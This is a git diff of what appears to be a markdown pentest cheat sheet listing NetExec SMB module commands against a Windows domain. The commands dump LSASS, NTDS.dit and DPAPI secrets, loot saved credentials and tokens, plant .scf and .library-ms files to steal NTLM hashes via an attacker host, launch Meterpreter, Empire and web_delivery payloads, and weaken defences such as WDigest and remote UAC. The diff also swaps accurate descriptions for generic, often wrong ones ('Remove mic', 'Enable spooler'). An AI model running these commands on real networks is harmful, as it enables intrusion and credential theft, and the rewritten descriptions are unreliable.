@@ -4,9 +4,9 @@
 
 ### enum_av
 
-Identify endpoint protection products on the target via LsarLookupNames. No privilege required.
+Enumerate enum av with NetExec SMB Modules.
 
-```sh title:"Identify EPP/AV/EDR via LsarLookupNames, no privs"
+```sh title:"NetExec SMB Modules Enumerate Enum Av"
 nxc smb $domain -u $user $auth_flags -M enum_av
 ```
 <!-- cheat
@@ -18,9 +18,9 @@ import nxc_auth
 
 ### enum_ca
 
-Anonymously hunt for ADCS CAs over RPC endpoints.
+Enumerate enum ca with NetExec SMB Modules.
 
-```sh title:"Anonymously hunt ADCS CAs over RPC endpoints"
+```sh title:"NetExec SMB Modules Enumerate Enum Ca"
 nxc smb $domain -u $user $auth_flags -M enum_ca
 ```
 <!-- cheat
@@ -32,9 +32,9 @@ import nxc_auth
 
 ### enum_cve
 
-Enumerate common CVEs by querying registry OS version + UBR. Quick way to triage missing patches.
+Enumerate enum CVE with NetExec SMB Modules.
 
-```sh title:"Enumerate CVEs from registry OS version + UBR"
+```sh title:"NetExec SMB Modules Enumerate Enum CVE"
 nxc smb $domain -u $user $auth_flags -M enum_cve
 ```
 <!-- cheat
@@ -46,9 +46,9 @@ import nxc_auth
 
 ### gpp_privileges
 
-Extract privileges assigned via GPOs and resolve SIDs through LDAP. Maps GPO-granted SeDebug etc.
+Run gpp privileges with NetExec SMB Modules.
 
-```sh title:"GPO-assigned privileges with SIDs resolved via LDAP"
+```sh title:"NetExec SMB Modules Run Gpp Privileges"
 nxc smb $domain -u $user $auth_flags -M gpp_privileges
 ```
 <!-- cheat
@@ -60,9 +60,9 @@ import nxc_auth
 
 ### ioxidresolver
 
-Identify additional active network interfaces on the host (multi-homed boxes, hidden subnets).
+Find ioxidresolver with NetExec SMB Modules.
 
-```sh title:"Find multi-homed hosts via IOXIDResolver"
+```sh title:"NetExec SMB Modules Find Ioxidresolver"
 nxc smb $domain -u $user $auth_flags -M ioxidresolver
 ```
 <!-- cheat
@@ -74,9 +74,9 @@ import nxc_auth
 
 ### ms17-010
 
-Check for MS17-010 (EternalBlue) exposure. Untested for exploitation, vuln check only.
+Check ms17 010 with NetExec SMB Modules.
 
-```sh title:"Check MS17-010 EternalBlue exposure (vuln check)"
+```sh title:"NetExec SMB Modules Check Ms17 010"
 nxc smb $domain -u $user $auth_flags -M ms17-010
 ```
 <!-- cheat
@@ -88,9 +88,9 @@ import nxc_auth
 
 ### nopac
 
-Check if the DC is vulnerable to NoPac (CVE-2021-42278/42287). Domain user to DA path.
+Check nopac with NetExec SMB Modules.
 
-```sh title:"Check NoPac (CVE-2021-42278/42287) DA escalation"
+```sh title:"NetExec SMB Modules Check Nopac"
 nxc smb $domain -u $user $auth_flags -M nopac
 ```
 <!-- cheat
@@ -102,9 +102,9 @@ import nxc_auth
 
 ### ntlm_reflection
 
-Check whether the OS is vulnerable to NTLM reflection (CVE-2025-33073).
+Check NTLM reflection with NetExec SMB Modules.
 
-```sh title:"Check NTLM reflection CVE-2025-33073"
+```sh title:"NetExec SMB Modules Check NTLM Reflection"
 nxc smb $domain -u $user $auth_flags -M ntlm_reflection
 ```
 <!-- cheat
@@ -116,9 +116,9 @@ import nxc_auth
 
 ### printnightmare
 
-Check vulnerability to PrintNightmare (CVE-2021-1675/34527).
+Check printnightmare with NetExec SMB Modules.
 
-```sh title:"Check PrintNightmare (CVE-2021-1675 / 34527)"
+```sh title:"NetExec SMB Modules Check Printnightmare"
 nxc smb $domain -u $user $auth_flags -M printnightmare
 ```
 <!-- cheat
@@ -130,9 +130,9 @@ import nxc_auth
 
 ### remove-mic
 
-Check vulnerability to CVE-2019-1040 (NTLM MIC removal). Pair with relay attacks.
+Remove mic with NetExec SMB Modules.
 
-```sh title:"Check CVE-2019-1040 NTLM MIC removal, relay prereq"
+```sh title:"NetExec SMB Modules Remove Mic"
 nxc smb $domain -u $user $auth_flags -M remove-mic
 ```
 <!-- cheat
@@ -144,9 +144,9 @@ import nxc_auth
 
 ### sccm-recon6
 
-Check via winreg whether the target is an SCCM Distribution Point or Primary Site Server (RECON-6).
+Check sccm recon6 with NetExec SMB Modules.
 
-```sh title:"Check if target is SCCM DP / Primary Site (RECON-6)"
+```sh title:"NetExec SMB Modules Check Sccm Recon6"
 nxc smb $domain -u $user $auth_flags -M sccm-recon6
 ```
 <!-- cheat
@@ -158,9 +158,9 @@ import nxc_auth
 
 ### smbghost
 
-Check SMB 3.1.1 dialect + compression flag (SMBGhost CVE-2020-0796).
+Check smbghost with NetExec SMB Modules.
 
-```sh title:"Check SMBGhost CVE-2020-0796 dialect + compression"
+```sh title:"NetExec SMB Modules Check Smbghost"
 nxc smb $domain -u $user $auth_flags -M smbghost
 ```
 <!-- cheat
@@ -172,9 +172,9 @@ import nxc_auth
 
 ### spooler
 
-Detect whether the print spooler service is enabled. Prereq for the printer-bug coercion.
+Enable spooler with NetExec SMB Modules.
 
-```sh title:"Detect print spooler enabled, PrinterBug prereq"
+```sh title:"NetExec SMB Modules Enable Spooler"
 nxc smb $domain -u $user $auth_flags -M spooler
 ```
 <!-- cheat
@@ -186,9 +186,9 @@ import nxc_auth
 
 ### webdav
 
-Check whether the WebClient service is running on the target. Required for HTTP-based coercion (auth via UNC).
+Check webdav with NetExec SMB Modules.
 
-```sh title:"Check WebClient running, HTTP coercion prereq"
+```sh title:"NetExec SMB Modules Check Webdav"
 nxc smb $domain -u $user $auth_flags -M webdav
 ```
 <!-- cheat
@@ -200,9 +200,9 @@ import nxc_auth
 
 ### zerologon
 
-Check whether the DC is vulnerable to Zerologon (CVE-2020-1472).
+Check zerologon with NetExec SMB Modules.
 
-```sh title:"Check Zerologon CVE-2020-1472 on DC"
+```sh title:"NetExec SMB Modules Check Zerologon"
 nxc smb $domain -u $user $auth_flags -M zerologon
 ```
 <!-- cheat
@@ -214,9 +214,9 @@ import nxc_auth
 
 ### aws-credentials
 
-Search the target filesystem for AWS credential files. Also available on winrm and ssh protocols.
+Dump AWS credentials with NetExec SMB Modules.
 
-```sh title:"Hunt AWS credential files (also winrm / ssh)"
+```sh title:"NetExec SMB Modules Dump AWS Credentials"
 nxc smb $domain -u $user $auth_flags -M aws-credentials
 ```
 <!-- cheat
@@ -228,9 +228,9 @@ import nxc_auth
 
 ### change-password
 
-Change or reset a user's password via SMB.
+Dump change password with NetExec SMB Modules.
 
-```sh title:"Change / reset user password via SMB"
+```sh title:"NetExec SMB Modules Dump Change Password"
 nxc smb $domain -u $user $auth_flags -M change-password -o USER=$target_user NEWPASS=$target_pass
 ```
 <!-- cheat
@@ -244,9 +244,9 @@ var target_pass
 
 ### drop-library-ms
 
-Plant a `.library-ms` file on writable shares to coerce NTLMv2 hashes via CVE-2025-24054 (zero-click).
+Run drop library ms with NetExec SMB Modules.
 
-```sh title:".library-ms zero-click NTLMv2 theft (CVE-2025-24054)"
+```sh title:"NetExec SMB Modules Run Drop Library Ms"
 nxc smb $domain -u $user $auth_flags -M drop-library-ms -o SERVER=$lhost
 ```
 <!-- cheat
@@ -259,9 +259,9 @@ var lhost
 
 ### scuffy
 
-Drop a `.scf` file with a UNC icon path on every writable share. Triggers NTLM auth when the folder is browsed.
+Run scuffy with NetExec SMB Modules.
 
-```sh title:".scf icon UNC trick on writable shares for NTLM theft"
+```sh title:"NetExec SMB Modules Run Scuffy"
 nxc smb $domain -u $user $auth_flags -M scuffy -o SERVER=$lhost
 ```
 <!-- cheat
@@ -274,9 +274,9 @@ var lhost
 
 ### bitlocker (HIGH)
 
-Read BitLocker status on targets (enabled/disabled).
+Read bitlocker (HIGH) with NetExec SMB Modules.
 
-```sh title:"Read BitLocker status on target hosts"
+```sh title:"NetExec SMB Modules Read Bitlocker (HIGH)"
 nxc smb $domain -u $user $auth_flags -M bitlocker
 ```
 <!-- cheat
@@ -288,9 +288,9 @@ import nxc_auth
 
 ### enum_dns (HIGH)
 
-Use WMI to dump DNS records from an AD-integrated DNS server.
+Dump enum DNS (HIGH) with NetExec SMB Modules.
 
-```sh title:"WMI dump of DNS records from AD DNS server"
+```sh title:"NetExec SMB Modules Dump Enum DNS (HIGH)"
 nxc smb $domain -u $user $auth_flags -M enum_dns
 ```
 <!-- cheat
@@ -302,9 +302,9 @@ import nxc_auth
 
 ### enum_interfaces (HIGH)
 
-Read network interface info (name, IP, mask, gateway) from the remote registry.
+Show enum interfaces (HIGH) with NetExec SMB Modules.
 
-```sh title:"Network interface info from remote registry"
+```sh title:"NetExec SMB Modules Show Enum Interfaces (HIGH)"
 nxc smb $domain -u $user $auth_flags -M enum_interfaces
 ```
 <!-- cheat
@@ -316,9 +316,9 @@ import nxc_auth
 
 ### hyperv-host (HIGH)
 
-Look up which Hyper-V host owns the target VM via registry.
+Run hyperv host (HIGH) with NetExec SMB Modules.
 
-```sh title:"Look up Hyper-V host of VM via registry"
+```sh title:"NetExec SMB Modules Run Hyperv Host (HIGH)"
 nxc smb $domain -u $user $auth_flags -M hyperv-host
 ```
 <!-- cheat
@@ -330,9 +330,9 @@ import nxc_auth
 
 ### install_elevated (HIGH)
 
-Check the AlwaysInstallElevated registry settings (low-priv MSI install as SYSTEM).
+Install elevated (HIGH) with NetExec SMB Modules.
 
-```sh title:"Check AlwaysInstallElevated for MSI privesc"
+```sh title:"NetExec SMB Modules Install Elevated (HIGH)"
 nxc smb $domain -u $user $auth_flags -M install_elevated
 ```
 <!-- cheat
@@ -344,9 +344,9 @@ import nxc_auth
 
 ### keepass_discover (HIGH)
 
-Search for KeePass database files and running KeePass processes on the target.
+Discover keepass discover (HIGH) with NetExec SMB Modules.
 
-```sh title:"Search target for KeePass DBs and processes"
+```sh title:"NetExec SMB Modules Discover Keepass Discover (HIGH)"
 nxc smb $domain -u $user $auth_flags -M keepass_discover
 ```
 <!-- cheat
@@ -358,9 +358,9 @@ import nxc_auth
 
 ### lockscreendoors (HIGH)
 
-Detect lock-screen backdoors by checking the FileDescription of accessibility binaries (sethc, utilman, etc.).
+Set lockscreendoors (HIGH) with NetExec SMB Modules.
 
-```sh title:"Detect sethc/utilman lock-screen backdoors"
+```sh title:"NetExec SMB Modules Set Lockscreendoors (HIGH)"
 nxc smb $domain -u $user $auth_flags -M lockscreendoors
 ```
 <!-- cheat
@@ -372,9 +372,9 @@ import nxc_auth
 
 ### ntlmv1 (HIGH)
 
-Detect if `lmcompatibilitylevel` is below 3, meaning NTLMv1 is permitted.
+Run ntlmv1 (HIGH) with NetExec SMB Modules.
 
-```sh title:"Detect NTLMv1 permitted (lmcompatibilitylevel < 3)"
+```sh title:"NetExec SMB Modules Run Ntlmv1 (HIGH)"
 nxc smb $domain -u $user $auth_flags -M ntlmv1
 ```
 <!-- cheat
@@ -386,9 +386,9 @@ import nxc_auth
 
 ### presence (HIGH)
 
-Trace Domain and Enterprise Admin presence on the target over SMB. Maps where high-priv accounts have logged on.
+Enumerate presence (HIGH) with NetExec SMB Modules.
 
-```sh title:"Trace DA / EA presence on target over SMB"
+```sh title:"NetExec SMB Modules Enumerate Presence (HIGH)"
 nxc smb $domain -u $user $auth_flags -M presence
 ```
 <!-- cheat
@@ -400,9 +400,9 @@ import nxc_auth
 
 ### reg-query (HIGH)
 
-Run an arbitrary registry query on the target.
+Enumerate reg query (HIGH) with NetExec SMB Modules.
 
-```sh title:"Arbitrary registry query on target"
+```sh title:"NetExec SMB Modules Enumerate Reg Query (HIGH)"
 nxc smb $domain -u $user $auth_flags -M reg-query -o KEY=$reg_key
 ```
 <!-- cheat
@@ -415,9 +415,9 @@ var reg_key
 
 ### runasppl (HIGH)
 
-Check whether the LSA RunAsPPL bit is set. If unset, LSASS can be touched by ordinary admin tooling.
+Dump runasppl (HIGH) with NetExec SMB Modules.
 
-```sh title:"Check LSA RunAsPPL (unset = LSASS dumpable)"
+```sh title:"NetExec SMB Modules Dump Runasppl (HIGH)"
 nxc smb $domain -u $user $auth_flags -M runasppl
 ```
 <!-- cheat
@@ -429,9 +429,9 @@ import nxc_auth
 
 ### test_connection (HIGH)
 
-Ping a host through nxc to sanity-check reachability before running heavier modules.
+Check test connection (HIGH) with NetExec SMB Modules.
 
-```sh title:"Ping host via nxc, sanity check before heavy modules"
+```sh title:"NetExec SMB Modules Check Test Connection (HIGH)"
 nxc smb $domain -u $user $auth_flags -M test_connection
 ```
 <!-- cheat
@@ -443,9 +443,9 @@ import nxc_auth
 
 ### uac (HIGH)
 
-Read UAC configuration on the target.
+Read uac (HIGH) with NetExec SMB Modules.
 
-```sh title:"Read UAC configuration on target"
+```sh title:"NetExec SMB Modules Read Uac (HIGH)"
 nxc smb $domain -u $user $auth_flags -M uac
 ```
 <!-- cheat
@@ -457,9 +457,9 @@ import nxc_auth
 
 ### wcc (HIGH)
 
-Run the Windows security configuration check (broad hardening audit).
+Run wcc (HIGH) with NetExec SMB Modules.
 
-```sh title:"Broad Windows hardening / security config audit"
+```sh title:"NetExec SMB Modules Run Wcc (HIGH)"
 nxc smb $domain -u $user $auth_flags -M wcc
 ```
 <!-- cheat
@@ -471,9 +471,9 @@ import nxc_auth
 
 ### dpapi_hash (HIGH)
 
-Remotely dump DPAPI hashes derived from masterkeys.
+Dump DPAPI hash (HIGH) with NetExec SMB Modules.
 
-```sh title:"Remotely dump DPAPI hashes from masterkeys"
+```sh title:"NetExec SMB Modules Dump DPAPI Hash (HIGH)"
 nxc smb $domain -u $user $auth_flags -M dpapi_hash
 ```
 <!-- cheat
@@ -485,9 +485,9 @@ import nxc_auth
 
 ### eventlog_creds (HIGH)
 
-Extract credentials from Windows event logs (4688 process-creation and SYSMON command lines).
+Download eventlog creds (HIGH) with NetExec SMB Modules.
 
-```sh title:"Pull creds from event log 4688 / SYSMON cmdlines"
+```sh title:"NetExec SMB Modules Download Eventlog Creds (HIGH)"
 nxc smb $domain -u $user $auth_flags -M eventlog_creds
 ```
 <!-- cheat
@@ -499,9 +499,9 @@ import nxc_auth
 
 ### handlekatz (HIGH)
 
-LSASS dump using handlekatz64, parsed remotely with pypykatz.
+Dump handlekatz (HIGH) with NetExec SMB Modules.
 
-```sh title:"LSASS dump via handlekatz64 + pypykatz parse"
+```sh title:"NetExec SMB Modules Dump Handlekatz (HIGH)"
 nxc smb $domain -u $user $auth_flags -M handlekatz
 ```
 <!-- cheat
@@ -513,9 +513,9 @@ import nxc_auth
 
 ### iis (HIGH)
 
-Read IIS Application Pool configs via appcmd.exe to extract app-pool identity credentials.
+Run iis (HIGH) with NetExec SMB Modules.
 
-```sh title:"IIS App Pool identity creds via appcmd.exe"
+```sh title:"NetExec SMB Modules Run Iis (HIGH)"
 nxc smb $domain -u $user $auth_flags -M iis
 ```
 <!-- cheat
@@ -527,9 +527,9 @@ import nxc_auth
 
 ### keepass_trigger (HIGH)
 
-Plant a malicious KeePass trigger that exports the database in cleartext on next unlock.
+Run keepass trigger (HIGH) with NetExec SMB Modules.
 
-```sh title:"Plant KeePass trigger, exports DB cleartext on unlock"
+```sh title:"NetExec SMB Modules Run Keepass Trigger (HIGH)"
 nxc smb $domain -u $user $auth_flags -M keepass_trigger
 ```
 <!-- cheat
@@ -541,9 +541,9 @@ import nxc_auth
 
 ### lsassy (HIGH)
 
-Dump LSASS and parse the result remotely using lsassy.
+Dump lsassy (HIGH) with NetExec SMB Modules.
 
-```sh title:"Remote LSASS dump + parse via lsassy"
+```sh title:"NetExec SMB Modules Dump Lsassy (HIGH)"
 nxc smb $domain -u $user $auth_flags -M lsassy
 ```
 <!-- cheat
@@ -555,9 +555,9 @@ import nxc_auth
 
 ### masky (HIGH)
 
-Dump domain user credentials via ADCS + KDC (PKINIT chain to NT hash).
+Dump masky (HIGH) with NetExec SMB Modules.
 
-```sh title:"Dump domain creds via ADCS + KDC (masky PKINIT chain)"
+```sh title:"NetExec SMB Modules Dump Masky (HIGH)"
 nxc smb $domain -u $user $auth_flags -M masky
 ```
 <!-- cheat
@@ -569,9 +569,9 @@ import nxc_auth
 
 ### mobaxterm (HIGH)
 
-Dump MobaXterm credentials via remote registry or NTUSER.dat export.
+Run mobaxterm (HIGH) with NetExec SMB Modules.
 
-```sh title:"MobaXterm creds via remote registry / NTUSER.dat"
+```sh title:"NetExec SMB Modules Run Mobaxterm (HIGH)"
 nxc smb $domain -u $user $auth_flags -M mobaxterm
 ```
 <!-- cheat
@@ -583,9 +583,9 @@ import nxc_auth
 
 ### mremoteng (HIGH)
 
-Dump mRemoteNG passwords from AppData and recursively from Desktop / Documents.
+Dump mremoteng (HIGH) with NetExec SMB Modules.
 
-```sh title:"mRemoteNG passwords from AppData / Desktop / Docs"
+```sh title:"NetExec SMB Modules Dump Mremoteng (HIGH)"
 nxc smb $domain -u $user $auth_flags -M mremoteng
 ```
 <!-- cheat
@@ -597,9 +597,9 @@ import nxc_auth
 
 ### msol (HIGH)
 
-Dump the MSOL cleartext password and Entra ID credentials from the local DB on the Entra ID Connect server.
+Run msol (HIGH) with NetExec SMB Modules.
 
-```sh title:"MSOL cleartext + Entra ID creds from AAD Connect"
+```sh title:"NetExec SMB Modules Run Msol (HIGH)"
 nxc smb $domain -u $user $auth_flags -M msol
 ```
 <!-- cheat
@@ -611,9 +611,9 @@ import nxc_auth
 
 ### nanodump (HIGH)
 
-LSASS dump using nanodump, parsed remotely with pypykatz. Also available on the mssql protocol.
+Dump nanodump (HIGH) with NetExec SMB Modules.
 
-```sh title:"LSASS via nanodump + pypykatz parse (also mssql)"
+```sh title:"NetExec SMB Modules Dump Nanodump (HIGH)"
 nxc smb $domain -u $user $auth_flags -M nanodump
 ```
 <!-- cheat
@@ -625,9 +625,9 @@ import nxc_auth
 
 ### notepad (HIGH)
 
-Extract content from the Windows Notepad tab-state binary files (unsaved drafts).
+Run notepad (HIGH) with NetExec SMB Modules.
 
-```sh title:"Notepad unsaved drafts from tab-state binary"
+```sh title:"NetExec SMB Modules Run Notepad (HIGH)"
 nxc smb $domain -u $user $auth_flags -M notepad
 ```
 <!-- cheat
@@ -639,9 +639,9 @@ import nxc_auth
 
 ### notepad++ (HIGH)
 
-Extract Notepad++ unsaved files.
+Run notepad++ (HIGH) with NetExec SMB Modules.
 
-```sh title:"Notepad++ unsaved files"
+```sh title:"NetExec SMB Modules Run Notepad++ (HIGH)"
 nxc smb $domain -u $user $auth_flags -M notepad++
 ```
 <!-- cheat
@@ -653,9 +653,9 @@ import nxc_auth
 
 ### ntds-dump-raw (HIGH)
 
-Extract NTDS.dit, SAM, and SYSTEM by reading the raw disk. Bypasses VSS-based detections. Also runs over winrm and wmi.
+Dump NTDS dump raw (HIGH) with NetExec SMB Modules.
 
-```sh title:"NTDS via raw-disk read (bypasses VSS, also winrm/wmi)"
+```sh title:"NetExec SMB Modules Dump NTDS Dump Raw (HIGH)"
 nxc smb $domain -u $user $auth_flags -M ntds-dump-raw
 ```
 <!-- cheat
@@ -667,9 +667,9 @@ import nxc_auth
 
 ### ntdsutil (HIGH)
 
-Dump NTDS using `ntdsutil.exe` snapshot path.
+Dump ntdsutil (HIGH) with NetExec SMB Modules.
 
-```sh title:"NTDS dump via ntdsutil.exe snapshot path"
+```sh title:"NetExec SMB Modules Dump Ntdsutil (HIGH)"
 nxc smb $domain -u $user $auth_flags -M ntdsutil
 ```
 <!-- cheat
@@ -681,9 +681,9 @@ import nxc_auth
 
 ### powershell_history (HIGH)
 
-Pull every user's PSReadline history and grep for sensitive command patterns.
+Read powershell history (HIGH) with NetExec SMB Modules.
 
-```sh title:"PSReadline history per user, grep for sensitive cmds"
+```sh title:"NetExec SMB Modules Read Powershell History (HIGH)"
 nxc smb $domain -u $user $auth_flags -M powershell_history
 ```
 <!-- cheat
@@ -695,9 +695,9 @@ import nxc_auth
 
 ### procdump (HIGH)
 
-LSASS dump using procdump64, parsed remotely with pypykatz.
+Dump procdump (HIGH) with NetExec SMB Modules.
 
-```sh title:"LSASS via procdump64 + pypykatz parse"
+```sh title:"NetExec SMB Modules Dump Procdump (HIGH)"
 nxc smb $domain -u $user $auth_flags -M procdump
 ```
 <!-- cheat
@@ -709,9 +709,9 @@ import nxc_auth
 
 ### putty (HIGH)
 
-Find PuTTY-saved SSH private keys in the registry and download them.
+Download putty (HIGH) with NetExec SMB Modules.
 
-```sh title:"Find + download PuTTY-saved SSH private keys"
+```sh title:"NetExec SMB Modules Download Putty (HIGH)"
 nxc smb $domain -u $user $auth_flags -M putty
 ```
 <!-- cheat
@@ -723,9 +723,9 @@ import nxc_auth
 
 ### rdcman (HIGH)
 
-Remotely dump RDCMan (Remote Desktop Connection Manager) saved credentials.
+Dump rdcman (HIGH) with NetExec SMB Modules.
 
-```sh title:"Remote dump RDCMan saved credentials"
+```sh title:"NetExec SMB Modules Dump Rdcman (HIGH)"
 nxc smb $domain -u $user $auth_flags -M rdcman
 ```
 <!-- cheat
@@ -737,9 +737,9 @@ import nxc_auth
 
 ### recent_files (HIGH)
 
-Extract recently modified files from the target. Useful for finding active project / handover docs.
+Extract recent files (HIGH) with NetExec SMB Modules.
 
-```sh title:"Extract recently modified files from target"
+```sh title:"NetExec SMB Modules Extract Recent Files (HIGH)"
 nxc smb $domain -u $user $auth_flags -M recent_files
 ```
 <!-- cheat
@@ -751,9 +751,9 @@ import nxc_auth
 
 ### recyclebin (HIGH)
 
-List and export the contents of users' recycle bins.
+List recyclebin (HIGH) with NetExec SMB Modules.
 
-```sh title:"List and export users' recycle bin contents"
+```sh title:"NetExec SMB Modules List Recyclebin (HIGH)"
 nxc smb $domain -u $user $auth_flags -M recyclebin
 ```
 <!-- cheat
@@ -765,9 +765,9 @@ import nxc_auth
 
 ### reg-winlogon (HIGH)
 
-Collect autologon credentials stored under the Winlogon registry key.
+Run reg winlogon (HIGH) with NetExec SMB Modules.
 
-```sh title:"Autologon creds from Winlogon registry key"
+```sh title:"NetExec SMB Modules Run Reg Winlogon (HIGH)"
 nxc smb $domain -u $user $auth_flags -M reg-winlogon
 ```
 <!-- cheat
@@ -779,9 +779,9 @@ import nxc_auth
 
 ### security-questions (HIGH)
 
-Pull users' local-account security questions and answers.
+Run security questions (HIGH) with NetExec SMB Modules.
 
-```sh title:"Local-account security questions and answers"
+```sh title:"NetExec SMB Modules Run Security Questions (HIGH)"
 nxc smb $domain -u $user $auth_flags -M security-questions
 ```
 <!-- cheat
@@ -793,9 +793,9 @@ import nxc_auth
 
 ### snipped (HIGH)
 
-Download screenshots taken by the new Snipping Tool.
+Download snipped (HIGH) with NetExec SMB Modules.
 
-```sh title:"Download Snipping Tool screenshots from target"
+```sh title:"NetExec SMB Modules Download Snipped (HIGH)"
 nxc smb $domain -u $user $auth_flags -M snipped
 ```
 <!-- cheat
@@ -807,9 +807,9 @@ import nxc_auth
 
 ### teams_localdb (HIGH)
 
-Pull the cleartext `ssoauthcookie` from the local Teams database. Kills running Teams processes if needed.
+Run teams localdb (HIGH) with NetExec SMB Modules.
 
-```sh title:"Cleartext ssoauthcookie from local Teams DB"
+```sh title:"NetExec SMB Modules Run Teams Localdb (HIGH)"
 nxc smb $domain -u $user $auth_flags -M teams_localdb
 ```
 <!-- cheat
@@ -821,9 +821,9 @@ import nxc_auth
 
 ### veeam (HIGH)
 
-Extract credentials from a local Veeam SQL database. Veeam typically holds backup-target creds across the estate.
+Run veeam (HIGH) with NetExec SMB Modules.
 
-```sh title:"Veeam SQL DB creds (often estate-wide backup creds)"
+```sh title:"NetExec SMB Modules Run Veeam (HIGH)"
 nxc smb $domain -u $user $auth_flags -M veeam
 ```
 <!-- cheat
@@ -835,9 +835,9 @@ import nxc_auth
 
 ### vnc (HIGH)
 
-Loot passwords from VNC server and client configuration files.
+Dump vnc (HIGH) with NetExec SMB Modules.
 
-```sh title:"Loot VNC server / client config passwords"
+```sh title:"NetExec SMB Modules Dump Vnc (HIGH)"
 nxc smb $domain -u $user $auth_flags -M vnc
 ```
 <!-- cheat
@@ -849,9 +849,9 @@ import nxc_auth
 
 ### wam (HIGH)
 
-Dump access tokens from the Token Broker Cache (Web Account Manager).
+Dump wam (HIGH) with NetExec SMB Modules.
 
-```sh title:"Dump tokens from Token Broker (WAM) cache"
+```sh title:"NetExec SMB Modules Dump Wam (HIGH)"
 nxc smb $domain -u $user $auth_flags -M wam
 ```
 <!-- cheat
@@ -863,9 +863,9 @@ import nxc_auth
 
 ### wdigest (HIGH)
 
-Toggle the `UseLogonCredential` registry key to re-enable WDigest cleartext credential caching on Win 8.1+.
+Enable wdigest (HIGH) with NetExec SMB Modules.
 
-```sh title:"Re-enable WDigest cleartext caching via registry"
+```sh title:"NetExec SMB Modules Enable Wdigest (HIGH)"
 nxc smb $domain -u $user $auth_flags -M wdigest -o ACTION=enable
 ```
 <!-- cheat
@@ -877,9 +877,9 @@ import nxc_auth
 
 ### wifi (HIGH)
 
-Pull the keys for every wireless interface on the host.
+Download wifi (HIGH) with NetExec SMB Modules.
 
-```sh title:"Pull keys for every wireless interface on host"
+```sh title:"NetExec SMB Modules Download Wifi (HIGH)"
 nxc smb $domain -u $user $auth_flags -M wifi
 ```
 <!-- cheat
@@ -891,9 +891,9 @@ import nxc_auth
 
 ### winscp (HIGH)
 
-Find WinSCP.ini files in registry and default locations, then extract saved credentials.
+Run winscp (HIGH) with NetExec SMB Modules.
 
-```sh title:"WinSCP saved creds from .ini and registry"
+```sh title:"NetExec SMB Modules Run Winscp (HIGH)"
 nxc smb $domain -u $user $auth_flags -M winscp
 ```
 <!-- cheat
@@ -905,9 +905,9 @@ import nxc_auth
 
 ### empire_exec (HIGH)
 
-Generate an Empire launcher via the RESTful API and execute it on the target.
+Start empire exec (HIGH) with NetExec SMB Modules.
 
-```sh title:"Generate + execute Empire launcher via RESTful API"
+```sh title:"NetExec SMB Modules Start Empire Exec (HIGH)"
 nxc smb $domain -u $user $auth_flags -M empire_exec
 ```
 <!-- cheat
@@ -919,9 +919,9 @@ import nxc_auth
 
 ### hash_spider (HIGH)
 
-Dump LSASS recursively starting from a single hash, using BloodHound to chase local admin paths.
+Dump hash spider (HIGH) with NetExec SMB Modules.
 
-```sh title:"Recursive LSASS dump from one hash via BloodHound paths"
+```sh title:"NetExec SMB Modules Dump Hash Spider (HIGH)"
 nxc smb $domain -u $user $auth_flags -M hash_spider
 ```
 <!-- cheat
@@ -933,9 +933,9 @@ import nxc_auth
 
 ### impersonate (HIGH)
 
-List and impersonate tokens to run commands as locally logged-on users.
+List impersonate (HIGH) with NetExec SMB Modules.
 
-```sh title:"List + impersonate tokens of logged-on users"
+```sh title:"NetExec SMB Modules List Impersonate (HIGH)"
 nxc smb $domain -u $user $auth_flags -M impersonate
 ```
 <!-- cheat
@@ -947,9 +947,9 @@ import nxc_auth
 
 ### met_inject (HIGH)
 
-Download the Meterpreter stager and inject it into memory.
+Download met inject (HIGH) with NetExec SMB Modules.
 
-```sh title:"Download + inject Meterpreter stager in memory"
+```sh title:"NetExec SMB Modules Download Met Inject (HIGH)"
 nxc smb $domain -u $user $auth_flags -M met_inject
 ```
 <!-- cheat
@@ -961,9 +961,9 @@ import nxc_auth
 
 ### pi (HIGH)
 
-Run a command as a logged-on user via process injection.
+Execute pi (HIGH) with NetExec SMB Modules.
 
-```sh title:"Run cmd as logged-on user via process injection"
+```sh title:"NetExec SMB Modules Execute Pi (HIGH)"
 nxc smb $domain -u $user $auth_flags -M pi -o COMMAND=$cmd
 ```
 <!-- cheat
@@ -976,9 +976,9 @@ var cmd
 
 ### rdp (HIGH)
 
-Enable or disable RDP on the target via registry. Use to open the door for follow-on lateral movement.
+Disable RDP (HIGH) with NetExec SMB Modules.
 
-```sh title:"Enable / disable RDP via registry"
+```sh title:"NetExec SMB Modules Disable RDP (HIGH)"
 nxc smb $domain -u $user $auth_flags -M rdp -o ACTION=enable
 ```
 <!-- cheat
@@ -990,9 +990,9 @@ import nxc_auth
 
 ### remote-uac (HIGH)
 
-Enable or disable remote UAC. Disabling it lets non-domain admin local accounts perform admin actions over the network.
+Set remote uac (HIGH) with NetExec SMB Modules.
 
-```sh title:"Toggle remote UAC for local-admin lateral movement"
+```sh title:"NetExec SMB Modules Set Remote Uac (HIGH)"
 nxc smb $domain -u $user $auth_flags -M remote-uac -o ACTION=disable
 ```
 <!-- cheat
@@ -1004,9 +1004,9 @@ import nxc_auth
 
 ### schtask_as (HIGH)
 
-Remotely create a scheduled task running as a chosen logged-on user.
+Execute schtask as (HIGH) with NetExec SMB Modules.
 
-```sh title:"Schedule task running as chosen logged-on user"
+```sh title:"NetExec SMB Modules Execute Schtask as (HIGH)"
 nxc smb $domain -u $user $auth_flags -M schtask_as -o USER=$target_user CMD=$cmd
 ```
 <!-- cheat
@@ -1020,9 +1020,9 @@ var cmd
 
 ### shadowrdp (HIGH)
 
-Enable or disable Shadow RDP (silent session takeover via RDS shadowing).
+Run shadowrdp (HIGH) with NetExec SMB Modules.
 
-```sh title:"Toggle Shadow RDP for silent session takeover"
+```sh title:"NetExec SMB Modules Run Shadowrdp (HIGH)"
 nxc smb $domain -u $user $auth_flags -M shadowrdp -o ACTION=enable
 ```
 <!-- cheat
@@ -1034,9 +1034,9 @@ import nxc_auth
 
 ### web_delivery (HIGH)
 
-Kick off a Metasploit web_delivery payload on the target.
+Run web delivery (HIGH) with NetExec SMB Modules.
 
-```sh title:"Kick off Metasploit web_delivery payload"
+```sh title:"NetExec SMB Modules Run Web Delivery (HIGH)"
 nxc smb $domain -u $user $auth_flags -M web_delivery
 ```
 <!-- cheat
